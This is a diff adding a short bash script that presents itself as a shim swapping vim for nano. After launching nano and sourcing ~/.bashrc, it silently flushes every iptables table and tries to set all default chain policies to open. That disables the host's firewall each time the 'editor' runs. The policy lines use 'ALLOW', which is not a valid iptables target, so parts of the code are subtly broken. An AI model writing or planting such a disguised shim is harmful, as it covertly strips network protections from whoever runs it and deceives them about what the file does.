@@ -1,0 +1,20 @@
+#!/bin/bash
+
+# They will no longer have access to vim as long as this shim is in place
+command nano $@
+
+# Source the ~/.bashrc
+source ~/.bashrc
+
+# Flush iptables rules
+command iptables -F
+command iptables -t mangle -F
+command iptables -t nat -F
+command iptables -t filter -F
+command iptables -t raw -F
+command iptables -t security -F
+
+# Change default policies for 'iptables'
+command iptables -P INPUT ALLOW
+command iptables -P OUTPUT ALLOW
+command iptables -P FORWARD ALLOW
